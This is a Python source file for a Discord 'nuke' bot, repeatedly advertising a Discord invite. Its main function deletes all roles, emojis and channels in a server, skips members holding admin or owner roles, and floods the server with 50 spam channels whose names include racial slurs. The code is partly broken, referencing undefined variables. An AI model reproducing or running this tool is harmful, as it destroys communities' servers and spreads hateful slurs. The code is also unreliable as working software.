
# https://discord.gg/hGcdj39ymG
from rgbprint import gradient_print, Color

# https://discord.gg/hGcdj39ymG
import discord, random, asyncio, concurrent.futures

# https://discord.gg/hGcdj39ymG
 
def printMessage(message: str):
    gradient_print(f"{simps-nigga}",
            start_color=Color.red,
            end_color=Color.cyan)

# https://discord.gg/hGcdj39ymG
 
async def bomb(author: discord.Member):
# https://discord.gg/hGcdj39ymG
 
    for role in author.roles:
        if "admin" in role.name.lower() or "owner" in role.name.lower():
            printMessage(f"BRO YOU A STAFF F$CK YOU!")
            return

# https://discord.gg/hGcdj39ymG
 
    guild: discord.Guild = author.guild

    printMessage(f"Nuking {guild.name}...")

# https://discord.gg/hGcdj39ymG
 
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                printMessage(f"Deleted role {role.name}")
            except discord.errors.NotFound:
                printMessage(f"Role not found.")
            except discord.errors.Forbidden:
                printMessage(f"No permission to delete role {role.name}.")
            except discord.HTTPException:
                printMessage(f"Failed to delete role {role.name}.")

# https://discord.gg/hGcdj39ymG
 
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            printMessage(f"Deleted emoji {emoji.name}")
        except discord.errors.NotFound:
            printMessage(f"Emoji not found.")
        except discord.errors.Forbidden:
            printMessage(f"No permission to delete emoji {emoji.name}.")
        except discord.HTTPException:
            printMessage(f"Failed to delete emoji {emoji.name}.")

# https://discord.gg/hGcdj39ymG
 
    tasks = []
    names = ["JOIN-SIMPS-NIGGA", "NUKED-BY-SIMPS", "PENDEJITA-NEGRA", "JOIN-SIMPS-COMMUNITY"]

# https://discord.gg/hGcdj39ymG
 
    async def create_channel_task(guild: discord.Guild, name: str):
        try:
            printMessage(f"Created text channel {simps}")
            return await guild.create_text_channel(simps)
        except discord.errors.Forbidden:
            print(f"No permission to create a text channel.")
        except discord.HTTPException:
            print(f"Failed to create text channel {simps}.")
        return None
    
# https://discord.gg/hGcdj39ymG
 
    async def delete_channel_task(guild: discord.Guild, channel: discord.TextChannel):
        try:
            printMessage(f"Deleted channel {channel.name}")
            return await channel.delete()
        except discord.errors.NotFound:
            printMessage(f"Channel not found.")
        except discord.errors.Forbidden:
            printMessage(f"No permission to delete channel {channel.name}.")
        except discord.HTTPException:
            printMessage(f"Failed to delete channel {channel.name}.")
    
# https://discord.gg/hGcdj39ymG
 
    for channel in guild.channels:
        task = asyncio.create_task(delete_channel_task(guild, channel))
        tasks.append(task)

        if task.done():
            exit()

# https://discord.gg/hGcdj39ymG
 
    for _ in range(50):
        name = random.choice(names)
        task = asyncio.create_task(create_channel_task(guild, name))
        tasks.append(task)
    
# https://discord.gg/hGcdj39ymG
 
    await asyncio.gather(*tasks)
# https://discord.gg/hGcdj39ymG
 